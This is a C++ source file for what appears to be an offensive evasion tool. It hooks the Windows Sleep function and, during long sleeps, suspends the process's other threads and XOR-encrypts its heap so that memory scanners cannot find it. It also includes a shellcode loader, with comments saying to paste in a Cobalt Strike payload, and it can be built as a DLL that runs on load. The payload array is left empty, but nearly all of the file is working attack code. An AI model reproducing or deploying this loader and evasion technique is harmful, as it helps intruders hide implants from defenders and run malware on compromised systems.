#include <windows.h>
#include <MinHook.h>

// Custom libs
#include "Encrypt.h"
#include "SuspendThreads.h"

#if defined _M_X64
#pragma comment(lib, "libMinHook-x64-v140-mt.lib")
#elif defined _M_IX86
#pragma comment(lib, "libMinHook-x86-v140-mt.lib")
#endif

// Encryption Key
const char key[2] = "A";
size_t keySize = sizeof(key);

PROCESS_HEAP_ENTRY entry;
void HeapEncryptDecrypt() {
    SecureZeroMemory(&entry, sizeof(entry));
    while (HeapWalk(GetProcessHeap(), &entry)) {
        if ((entry.wFlags & PROCESS_HEAP_ENTRY_BUSY) != 0) {
            xor_bidirectional_encode(key, keySize, (char*)(entry.lpData), entry.cbData);
        }
    }
}

void(WINAPI* OldSleep)(DWORD dwMiliseconds);
//Hooked Sleep
void WINAPI HookedSleep(DWORD dwMiliseconds) {
    DWORD time = dwMiliseconds;
    if (time > 1000) {
        DoSuspendThreads(GetCurrentProcessId(), GetCurrentThreadId());
        HeapEncryptDecrypt();

        OldSleep(dwMiliseconds);

        HeapEncryptDecrypt();
        DoResumeThreads(GetCurrentProcessId(), GetCurrentThreadId());
    }
    else {
        OldSleep(time);
    }
}

template <typename T>
inline MH_STATUS MH_CreateHookEx(LPVOID pTarget, LPVOID pDetour, T** ppOriginal)
{
    return MH_CreateHook(pTarget, pDetour, reinterpret_cast<LPVOID*>(ppOriginal));
}

template <typename T>
inline MH_STATUS MH_CreateHookApiEx(
    LPCWSTR pszModule, LPCSTR pszProcName, LPVOID pDetour, T** ppOriginal)
{
    return MH_CreateHookApi(
        pszModule, pszProcName, pDetour, reinterpret_cast<LPVOID*>(ppOriginal));
}

int main()
{
    //DoSuspendThreads(GetCurrentProcessId(), GetCurrentThreadId());
    // Initialize MinHook.
    if (MH_Initialize() != MH_OK)
    {
        return 1;
    }

    if (MH_CreateHookApiEx(
        L"kernel32.dll", "Sleep", &HookedSleep, &OldSleep) != MH_OK)
    {
        return 1;
    }

    // Enable the hook for MessageBoxW.
    if (MH_EnableHook(MH_ALL_HOOKS) != MH_OK)
    {
        return 1;
    }
    //DoResumeThreads(GetCurrentProcessId(), GetCurrentThreadId());

#if !defined(RELEASE_DLL) && !defined(RELEASE_DLL64)
    // Cobalt Strike Shellcode goes here.
    // Made with Payload Generator -> C -> Tick x64.
    unsigned char dll[] = ""; // Change this
    // This size also comes from the generated payload file
    SIZE_T size = 0; // Change This
    SIZE_T bytesWritten = 0;
    DWORD oldProtect = 0;
    void* sh = VirtualAllocEx(GetCurrentProcess(), 0, (SIZE_T)size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    WriteProcessMemory(GetCurrentProcess(), sh, dll, size, &bytesWritten);
    VirtualProtectEx(GetCurrentProcess(), sh, size, PAGE_EXECUTE_READ, &oldProtect);
    ((void(*)())sh)(); // Comment this and uncomment the 2 below to do this in a seperate thread instead.
    //CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)sh, NULL, 0, &hookID);
    //while (TRUE);
#endif
    return 0;
}

#if defined(RELEASE_DLL) || defined(RELEASE_DLL64)
BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,  // handle to DLL module
    DWORD fdwReason,     // reason for calling function
    LPVOID lpReserved)  // reserved
{
    // Perform actions based on the reason for calling.
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        // Initialize once for each new process.
        // Return FALSE to fail DLL load.
        main();
        break;

    case DLL_THREAD_ATTACH:
        // Do thread-specific initialization.
        break;

    case DLL_THREAD_DETACH:
        // Do thread-specific cleanup.
        break;

    case DLL_PROCESS_DETACH:
        // Perform any necessary cleanup.
        break;
    }
    return TRUE;  // Successful DLL_PROCESS_ATTACH.
}
#endif